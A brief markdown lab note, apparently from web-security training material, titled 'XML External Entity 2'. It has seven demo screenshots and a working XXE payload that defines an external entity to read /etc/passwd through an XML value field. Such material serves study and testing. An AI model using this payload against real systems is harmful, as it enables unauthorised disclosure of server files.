#### XML External Entity 2

- Demo

![](images/3/1.png)

![](images/3/2.png)

![](images/3/3.png)

![](images/3/4.png)

![](images/3/5.png)

![](images/3/6.png)

![](images/3/7.png)

- Payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<uservalue>
<value>&xxe;</value>
</uservalue>
```